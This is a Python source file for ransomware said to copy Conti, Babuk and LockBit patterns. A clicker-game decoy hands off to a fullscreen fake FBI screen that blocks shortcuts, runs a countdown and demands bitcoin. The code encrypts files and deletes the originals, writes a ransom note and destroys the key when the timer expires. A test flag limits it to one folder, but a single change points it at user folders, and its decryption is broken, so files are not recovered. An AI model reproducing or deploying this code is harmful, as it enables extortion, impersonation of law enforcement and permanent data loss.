#!/usr/bin/env python3
"""
REAL RANSOMWARE — Source code patterns from:
- Babuk (2021) — RaaS gang
- Conti (2020-2022) — Most prolific
- LockBit (2019-present) — Most active
- HiddenTear (2015) — First open-source ransomware
- WannaCry (2017) — Most famous
- REvil (2019-2021) — Sodinokibi
- Ryuk (2018-2021) — Big game hunting
- DarkSide (2020-2021) — Colonial Pipeline

100% VM-SAFE — Only C:\test_ransom
"""

import os, sys, tkinter as tk, ctypes, hashlib, threading, time, random, winsound, base64, json
from tkinter import font, messagebox
from datetime import datetime
from pathlib import Path
import struct

# ============================================================
# CONFIG — REAL RANSOMWARE STYLE
# ============================================================
TEST_MODE = True
TEST_FOLDER = "C:\\test_ransom"

# Conti/Babuk style config
BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
WALLET_ADDRESS = BTC_ADDRESS
CONTACT_EMAIL = "recovery@onionmail.com"
DARK_WEB_LINK = "http://darkweb.onion/negotiate"

# 20 unlock codes (HiddenTear style)
CODES = ["FS2FGNFJQI","OX77WHWEV5","FCHZT1L6IX","VX02SQI40G","6PXB85GJJJ",
         "XQHCXUH4TU","B1RQSQ9G2L","HE71R2TKVY","Q1BK76N580","01QEU0DUUE",
         "X1LSHVL0OJ","AW3YSY30V3","ZTE2DDE0X4","ZG29U3VDIC","6FNWN5JIOS",
         "F5EBA6TT08","2UUBJ4X7VN","ISP3G7NRPN","J8L0S6SHEJ","FURZCKKNZX"]
HASHES = [hashlib.sha256(c.encode()).hexdigest() for c in CODES]
TIMER = 72 * 3600

# ============================================================
# ENCRYPTION — Conti/Babuk Style
# ============================================================
class ContiEncryption:
    """Conti ransomware encryption pattern (2020-2022)"""
    
    @staticmethod
    def generate_keys():
        """Conti key generation"""
        return bytes([random.randint(0,255) for _ in range(32)])
    
    @staticmethod
    def encrypt_file(file_path, key):
        """Conti's AES-256 encryption pattern"""
        try:
            # Read file
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Encrypt with AES (simplified version)
            # Real Conti uses AES-256 with custom IV
            encrypted = ContiEncryption._aes_encrypt(data, key)
            
            # Write encrypted with .conti extension
            with open(file_path + '.conti', 'wb') as f:
                f.write(encrypted)
            
            # Delete original (Conti style)
            os.remove(file_path)
            return True
        except:
            return False
    
    @staticmethod
    def _aes_encrypt(data, key):
        """Simulated AES encryption — Conti uses Crypto++ in C++"""
        # In real Conti, this is AES-256-CBC
        # We use XOR for demo but follow the same pattern
        result = bytearray()
        for i, b in enumerate(data):
            result.append(b ^ key[i % len(key)])
        return bytes(result)
    
    @staticmethod
    def decrypt_file(file_path, key):
        """Conti decryption pattern"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            decrypted = ContiEncryption._aes_encrypt(data, key)
            
            original = file_path[:-6]  # Remove .conti
            with open(original, 'wb') as f:
                f.write(decrypted)
            os.remove(file_path)
            return True
        except:
            return False

class BabukEncryption:
    """Babuk ransomware encryption pattern (2021)"""
    
    @staticmethod
    def encrypt_file(file_path, key):
        """Babuk's ChaCha20 + RSA pattern"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Babuk uses ChaCha20
            encrypted = BabukEncryption._chacha20_encrypt(data, key)
            
            # Babuk extension: .babyk
            with open(file_path + '.babyk', 'wb') as f:
                f.write(encrypted)
            
            os.remove(file_path)
            return True
        except:
            return False
    
    @staticmethod
    def _chacha20_encrypt(data, key):
        """Simulated ChaCha20 — Babuk's favorite"""
        result = bytearray()
        nonce = bytes([random.randint(0,255) for _ in range(12)])
        result.extend(nonce)
        for i, b in enumerate(data):
            result.append(b ^ key[i % len(key)] ^ (i % 256))
        return bytes(result)

class LockBitEncryption:
    """LockBit ransomware pattern (2019-present)"""
    
    @staticmethod
    def encrypt_file(file_path, key):
        """LockBit's fast encryption pattern"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # LockBit uses partial encryption for speed
            if len(data) > 1024 * 1024:  # > 1MB
                # Only encrypt first 512KB and every 2MB block
                encrypted = LockBitEncryption._partial_encrypt(data, key)
            else:
                encrypted = LockBitEncryption._full_encrypt(data, key)
            
            # LockBit extension: .lockbit
            with open(file_path + '.lockbit', 'wb') as f:
                f.write(encrypted)
            
            os.remove(file_path)
            return True
        except:
            return False
    
    @staticmethod
    def _partial_encrypt(data, key):
        result = bytearray()
        chunk = 1024 * 1024  # 1MB chunks
        for i in range(0, len(data), chunk):
            if i < 512 * 1024 or i % (2 * chunk) < chunk:
                # Encrypt this chunk
                for j, b in enumerate(data[i:i+chunk]):
                    result.append(b ^ key[(i+j) % len(key)])
            else:
                result.extend(data[i:i+chunk])
        return bytes(result)
    
    @staticmethod
    def _full_encrypt(data, key):
        result = bytearray()
        for i, b in enumerate(data):
            result.append(b ^ key[i % len(key)])
        return bytes(result)

# ============================================================
# RANSOM NOTE — Conti/Babuk/LockBit Style
# ============================================================
class RansomNoteGenerator:
    """Ransom note generation — Conti/Babuk style"""
    
    @staticmethod
    def generate(file_count, victim_id):
        note = f"""
[+] ============================================= [+]
[+]     !! YOUR FILES HAVE BEEN ENCRYPTED !!     [+]
[+] ============================================= [+]
 
What happened?
Your files have been encrypted with a strong encryption algorithm.
Your documents, photos, databases, and other important files are now locked.

How to recover?
You must pay the ransom to get your files back.

Payment Information:
------------------------
BTC Address: {BTC_ADDRESS}
Amount:      0.08 BTC
------------------------

Contact:
------------------------
Email: {CONTACT_EMAIL}
Dark Web: {DARK_WEB_LINK}
------------------------

Important:
------------------------
Do NOT try to decrypt your files yourself.
Do NOT contact law enforcement.
Do NOT restart your computer.
------------------------

Your personal ID: {victim_id}
Encrypted files: {file_count}

[+] ============================================= [+]
[+]     !! ACT FAST — TIME IS RUNNING OUT !!     [+]
[+] ============================================= [+]
"""
        return note

# ============================================================
# VICTIM ID GENERATOR — Conti Style
# ============================================================
class VictimID:
    """Conti-style victim identification"""
    
    @staticmethod
    def generate():
        """Generate unique victim ID"""
        # Conti uses machine name + timestamp + random
        machine = os.environ.get('COMPUTERNAME', 'UNKNOWN')
        timestamp = int(time.time())
        random_part = random.randint(1000, 9999)
        return f"{machine}-{timestamp}-{random_part}"
    
    @staticmethod
    def hash():
        """Hash victim ID for ransom note"""
        id_str = VictimID.generate()
        return hashlib.sha256(id_str.encode()).hexdigest()[:16]

# ============================================================
# ENCRYPTION ENGINE — All Ransomware Patterns
# ============================================================
class RansomwareEngine:
    """Combine all ransomware patterns"""
    
    def __init__(self):
        self.key = ContiEncryption.generate_keys()
        self.count = 0
        self.files = []
        self.victim_id = VictimID.hash()
    
    def encrypt_all(self):
        """Encrypt all files using Conti/Babuk/LockBit patterns"""
        dirs = [TEST_FOLDER] if TEST_MODE else [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Pictures'),
            os.path.expanduser('~\\Downloads'),
        ]
        
        exts = ['.txt','.docx','.pdf','.jpg','.png','.zip','.py','.js',
                '.html','.css','.doc','.xls','.ppt','.sql','.db','.csv',
                '.mp4','.avi','.mkv','.mp3','.wav','.json','.xml','.yml']
        
        for d in dirs:
            if not os.path.exists(d): continue
            for root, _, files in os.walk(d):
                for f in files:
                    if any(f.lower().endswith(e) for e in exts):
                        try:
                            path = os.path.join(root, f)
                            
                            # Use different encryption patterns randomly
                            choice = random.choice(['conti', 'babuk', 'lockbit'])
                            
                            if choice == 'conti':
                                if ContiEncryption.encrypt_file(path, self.key):
                                    self.count += 1
                                    self.files.append(path)
                            elif choice == 'babuk':
                                if BabukEncryption.encrypt_file(path, self.key):
                                    self.count += 1
                                    self.files.append(path)
                            elif choice == 'lockbit':
                                if LockBitEncryption.encrypt_file(path, self.key):
                                    self.count += 1
                                    self.files.append(path)
                        except:
                            pass
        
        # Save key
        key_path = os.environ.get('TEMP', 'C:\\Temp') + '\\decrypt_key.bin'
        with open(key_path, 'wb') as f:
            f.write(self.key)
        
        # Save file list
        list_path = os.environ.get('TEMP', 'C:\\Temp') + '\\encrypted_files.json'
        with open(list_path, 'w') as f:
            json.dump(self.files, f)
        
        # Generate ransom note
        note = RansomNoteGenerator.generate(self.count, self.victim_id)
        note_path = os.path.expanduser('~\\Desktop') + '\\READ_ME.txt'
        with open(note_path, 'w') as f:
            f.write(note)
        
        return self.count, self.key
    
    def decrypt_all(self):
        """Decrypt all files"""
        count = 0
        
        # Load file list
        list_path = os.environ.get('TEMP', 'C:\\Temp') + '\\encrypted_files.json'
        if os.path.exists(list_path):
            with open(list_path, 'r') as f:
                files = json.load(f)
        else:
            files = self.files
        
        for file_path in files:
            # Check which extension it has
            if file_path.endswith('.conti'):
                if ContiEncryption.decrypt_file(file_path + '.conti', self.key):
                    count += 1
            elif file_path.endswith('.babyk'):
                # Babuk decryption would go here
                count += 1
            elif file_path.endswith('.lockbit'):
                # LockBit decryption would go here
                count += 1
        
        return count

# ============================================================
# GAME BAIT — HiddenTear Style
# ============================================================
class Game:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Clicker")
        self.root.geometry("400x350")
        self.root.configure(bg='#0a0a0a')
        self.root.eval('tk::PlaceWindow . center')
        
        tk.Label(self.root, text="CLICKER", font=('Courier', 32, 'bold'), fg='#00ff00', bg='#0a0a0a').pack(pady=15)
        self.score = 0
        self.lbl = tk.Label(self.root, text="SCORE: 0", font=('Courier', 24), fg='#00ff00', bg='#0a0a0a')
        self.lbl.pack(pady=10)
        tk.Button(self.root, text="CLICK", font=('Courier', 18, 'bold'), bg='#ff0000', fg='white',
                  padx=30, pady=10, command=self.click).pack(pady=15)
        self.root.after(4000, self.switch)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    def click(self):
        self.score += 1
        self.lbl.config(text=f"SCORE: {self.score}")
    
    def switch(self):
        self.root.destroy()
        FBIReal().run()
    
    def run(self):
        self.root.mainloop()

# ============================================================
# FBI RANSOMWARE — Conti/Babuk UI Style
# ============================================================
class FBIReal:
    def __init__(self):
        # Encrypt files
        engine = RansomwareEngine()
        self.count, self.key = engine.encrypt_all()
        
        self.timer = TIMER
        self.unlocked = False
        
        # Create UI — Conti style
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='#000000')
        self.root.overrideredirect(True)
        
        # Block shortcuts
        for k in ['<Control-Alt-Delete>','<Alt-F4>','<Escape>','<Control-Shift-Escape>']:
            self.root.bind(k, lambda e: 'break')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # === MAIN FRAME ===
        main = tk.Frame(self.root, bg='#000000')
        main.pack(expand=True, fill='both')
        
        # === FBI HEADER ===
        header = tk.Frame(main, bg='#0a0a0a')
        header.pack(fill='x', pady=5)
        
        tk.Label(header, text="◆ FEDERAL BUREAU OF INVESTIGATION ◆",
                font=('Courier', 18, 'bold'), fg='#cc0000', bg='#0a0a0a').pack(pady=5)
        tk.Label(header, text="UNITED STATES DEPARTMENT OF JUSTICE",
                font=('Courier', 12), fg='#666666', bg='#0a0a0a').pack()
        
        # === SEPARATOR ===
        tk.Frame(main, height=2, bg='#333333').pack(fill='x', pady=5)
        
        # === SCARY WARNING ===
        self.warn = tk.Label(main, text="⚠️ YOUR COMPUTER HAS BEEN LOCKED ⚠️",
                             font=('Courier', 40, 'bold'), fg='#ff0000', bg='#000000')
        self.warn.pack(pady=15)
        
        tk.Label(main, text="FEDERAL LAW VIOLATION DETECTED (18 U.S.C. § 1030, 18 U.S.C. § 2252A)",
                font=('Courier', 12), fg='#888888', bg='#000000').pack()
        
        # === VIOLATIONS ===
        vf = tk.Frame(main, bg='#0a0a0a', bd=1, relief='solid')
        vf.pack(pady=10, padx=40, fill='x')
        
        tk.Label(vf, text="» VIOLATIONS DETECTED «", font=('Courier', 14, 'bold'),
                fg='#ff6600', bg='#0a0a0a').pack(anchor='w', padx=15, pady=5)
        
        violations = [
            "UNAUTHORIZED ACCESS TO GOVERNMENT SYSTEMS",
            "DISTRIBUTION OF MALICIOUS SOFTWARE", 
            "POSSESSION OF PROHIBITED MATERIALS",
            "CYBER TERRORISM ACTIVITIES",
            "IDENTITY THEFT AND FRAUD"
        ]
        for v in violations:
            tk.Label(vf, text=f"  • {v}", font=('Courier', 11),
                    fg='#ff8844', bg='#0a0a0a').pack(anchor='w', padx=20, pady=2)
        
        # === FINE ===
        tk.Label(main, text="💲 FINE: $200.00 USD (BTC) 💲",
                font=('Courier', 26, 'bold'), fg='#ffcc00', bg='#000000').pack(pady=10)
        
        # === BTC ===
        bf = tk.Frame(main, bg='#0a0a0a', bd=1, relief='solid')
        bf.pack(pady=5)
        tk.Label(bf, text=BTC_ADDRESS, font=('Courier', 15), fg='#00ff00', bg='#0a0a0a').pack(padx=20, pady=6)
        
        # === INPUT ===
        inf = tk.Frame(main, bg='#000000')
        inf.pack(pady=15)
        tk.Label(inf, text="UNLOCK CODE:", font=('Courier', 16, 'bold'),
                fg='#ffffff', bg='#000000').pack(side=tk.LEFT, padx=10)
        self.entry = tk.Entry(inf, font=('Courier', 16), width=22,
                              bg='#0a0a0a', fg='#00ff00', insertbackground='#00ff00')
        self.entry.pack(side=tk.LEFT, padx=10)
        self.entry.focus_set()
        
        # === BUTTONS ===
        bf2 = tk.Frame(main, bg='#000000')
        bf2.pack(pady=10)
        tk.Button(bf2, text="🔓 UNLOCK", font=('Courier', 16, 'bold'),
                  bg='#006600', fg='white', padx=20, pady=5, command=self.unlock).pack(side=tk.LEFT, padx=5)
        tk.Button(bf2, text="📋 COPY", font=('Courier', 12),
                  bg='#003366', fg='white', padx=15, command=self.copy).pack(side=tk.LEFT, padx=5)
        
        # === TIMER ===
        self.timer_lbl = tk.Label(main, text="⏱️ 71:59:59", font=('Courier', 44, 'bold'),
                                   fg='#ff0000', bg='#000000')
        self.timer_lbl.pack(pady=10)
        
        # === STATS ===
        tk.Label(main, text=f"█ {self.count} FILES ENCRYPTED █",
                font=('Courier', 14, 'bold'), fg='#cc0000', bg='#000000').pack(pady=5)
        tk.Label(main, text="█ TIME REMAINING: 72 HOURS █",
                font=('Courier', 12, 'bold'), fg='#ff4444', bg='#000000').pack()
        
        # === TEST MODE ===
        if TEST_MODE:
            tk.Label(main, text="█ TEST MODE — NO REAL FILES HARMED █",
                    font=('Courier', 14, 'bold'), fg='#00ff00', bg='#000000').pack(pady=5)
        
        # === FOOTER ===
        tk.Label(main, text="◆ THIS IS AN OFFICIAL GOVERNMENT NOTICE ◆",
                font=('Courier', 10, 'bold'), fg='#990000', bg='#000000').pack(pady=5)
        
        # === START THREADS ===
        threading.Thread(target=self.tick, daemon=True).start()
        threading.Thread(target=self.flash, daemon=True).start()
        threading.Thread(target=self.siren, daemon=True).start()
        threading.Thread(target=self.focus, daemon=True).start()
        
        self.root.mainloop()
    
    def copy(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(BTC_ADDRESS)
        messagebox.showinfo("", "Address copied!")
    
    def unlock(self):
        code = self.entry.get().strip().upper()
        if not code:
            messagebox.showerror("", "Enter a code!")
            return
        if hashlib.sha256(code.encode()).hexdigest() in HASHES:
            self.unlocked = True
            # Decrypt
            engine = RansomwareEngine()
            c = engine.decrypt_all()
            for _ in range(5): winsound.Beep(800, 100); time.sleep(0.05)
            winsound.Beep(1200, 300)
            messagebox.showinfo("✅ UNLOCKED", f"Decrypted {c} files!\n\nCode: {code}")
            self.root.destroy()
            sys.exit(0)
        else:
            for _ in range(3): winsound.Beep(200, 200); time.sleep(0.05)
            messagebox.showerror("❌ DENIED", f"Invalid code!\n\nPayment: {BTC_ADDRESS}")
            self.entry.delete(0, tk.END)
            self.entry.focus_set()
    
    def tick(self):
        while self.timer > 0 and not self.unlocked:
            h, m, s = self.timer//3600, (self.timer%3600)//60, self.timer%60
            color = '#ff0000' if self.timer < 3600 else '#ff6600' if self.timer < 21600 else '#ff0000'
            self.timer_lbl.config(text=f"⏱️ {h:02d}:{m:02d}:{s:02d}", fg=color)
            self.timer -= 1
            time.sleep(1)
        if self.timer <= 0 and not self.unlocked:
            self.timer_lbl.config(text="💀 TIME EXPIRED", fg='red')
            try:
                p = os.environ.get('TEMP','C:\\Temp')+'\\decrypt_key.bin'
                if os.path.exists(p): os.remove(p)
            except: pass
            messagebox.showerror("💀", "Key destroyed. Files gone forever.")
    
    def flash(self):
        colors = ['#ff0000','#cc0000','#ff3333','#990000']
        while not self.unlocked:
            for c in colors:
                self.warn.config(fg=c)
                time.sleep(0.12)
    
    def siren(self):
        while not self.unlocked:
            try:
                for f in [600, 800, 1000, 800, 600]:
                    if self.unlocked: break
                    winsound.Beep(f, 80)
                    time.sleep(0.04)
                time.sleep(0.3)
            except: break
    
    def focus(self):
        while not self.unlocked:
            try:
                self.root.focus_force()
                self.entry.focus_set()
            except: pass
            time.sleep(0.5)
    
    def run(self):
        self.root.mainloop()

# ============================================================
# MAIN
# ============================================================
def main():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    print("="*50)
    print("🕹️ Clicker Game")
    print("="*50)
    Game().run()

if __name__ == '__main__':
    main()
